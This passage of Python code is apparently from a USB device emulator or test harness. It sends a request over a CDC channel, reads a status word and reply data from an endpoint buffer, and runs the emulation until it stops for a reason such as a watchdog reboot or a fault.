        self.h.cdc.write(request)
        self._run_until(lambda: len(self.h.usb_mac.ep1_in) - mark >= 4)
        status = self._take_dword(mark)
        data_len = self._reply_data_len(code, args, status)
        if data_len:
            self._run_until(lambda: len(self.h.usb_mac.ep1_in) - mark
                            >= 4 + data_len)
        data = bytes(self.h.usb_mac.ep1_in[mark + 4:mark + 4 + data_len])
        return status, data

    def run_until_stop(self):
        """Run the emulation (e.g. while the device idles) until it ends
        for real: 'wdt-reboot', 'fault', 'budget'..."""
        while True:
            reason = self.h.resume()
            if reason != 'io':
                return reason
